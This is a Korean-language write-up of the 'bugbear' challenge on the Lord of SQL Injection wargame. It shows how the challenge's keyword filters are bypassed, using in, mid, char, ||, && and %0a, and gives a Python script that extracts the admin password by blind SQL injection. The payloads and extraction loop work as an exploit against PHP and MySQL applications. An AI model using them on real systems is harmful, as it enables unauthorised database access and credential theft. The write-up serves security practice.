<img width="200" alt="스크린샷 2020-01-19 오전 12 45 09" src="https://user-images.githubusercontent.com/54495632/72677825-d001fd80-3ae3-11ea-9aae-63c06c7c454a.png">



13번 bugbear



<img width="799" alt="스크린샷 2020-01-19 오전 12 45 19" src="https://user-images.githubusercontent.com/54495632/72677834-d8f2cf00-3ae3-11ea-9c0b-f33a8ad5e10a.png">



if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
if(preg_match('/\'|substr|ascii|=|or|and| |like|0x/i', $_GET[no])) exit("HeHe");

pw , no 에서 공통적으로 작은 따옴표가 필터링 된다. -> " 쌍 따옴표 이용.
no에서는 substr ascii = or and 공백 like 0x 가 필터링된다.

subset - mid함수를 이용했고

ascii - 필터링되면 ord 를 이용할 수 있지만 or도 필터링 처리 되어 hex함수를 이용했다.

= 등호와 like가 필터링 되어 우회하는 방법을 찾아보니

instr 함수를 이용하는 방법이 있었다.
instr(string $str,string $substr)

ex) instr(id,"admin)

또는 in 연산자를 이용하여
id in ("admin") 과 같이 사용할 수 있다.

or - || , and - && 와 같이 필터링을 우회한다.
공백 - %0a , 방법등은 많다.



<img width="882" alt="스크린샷 2020-01-19 오전 1 04 18" src="https://user-images.githubusercontent.com/54495632/72677910-81089800-3ae4-11ea-95a9-d46c9fb0bbb8.png">



pw='' and no=""||id in ("admin")&&length(pw)<9&&length(pw)>7 과 같이 쿼리를 주면
부등호와 &&를 이용하여 = 대신 사용할 수 있다. pw의 길이는 8이다.



<img width="826" alt="스크린샷 2020-01-19 오후 7 13 17" src="https://user-images.githubusercontent.com/54495632/72679185-2117ee80-3af0-11ea-9c11-140a1c8c21d1.png">



pw='' and no=""||id in ("admin")&&mid(pw,1,1) in (char(53))
와 같은 쿼리를 URL로 입력하여 pw의 각 글자를 유추할 수 있다.
= 등호 대신 in 를 이용하고 char을 이용하였다.

mid로 나오는 각 문자열 한글자 씩을 char 함수를 이용해 문자 자체를 비교하여
각 pw 자리값을 찾는다.



<img width="244" alt="스크린샷 2020-01-19 오후 7 25 57" src="https://user-images.githubusercontent.com/54495632/72679380-f7f85d80-3af1-11ea-8e66-37d69c10ba86.png">



파이썬을 이용하여 8자리를 구하였다.


import requests

cookies={'PHPSESSID':'votgib2k2ndb0c407hmbucfm2o'}
url="https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?"

pw=""
for i in range(1,9):
    for j in range(128,33,-1):
        query="pw=&no=%22%22||id%0ain%0a%28%22admin%22%29%26%26mid%28pw%2C"+str(i)+"%2C1%29%0ain%0a%28char%28"+str(j)+"%29%29"
        geturl=url+query
        res=requests.get(geturl,cookies=cookies)
        if((res.text).find("Hello admin")>0):
            pw+=chr(j)
            print (pw)
            break

print ("finish pw :"+pw)



<img width="648" alt="스크린샷 2020-01-19 오후 7 22 00" src="https://user-images.githubusercontent.com/54495632/72679427-5b828b00-3af2-11ea-8a94-85fc7f4be7be.png">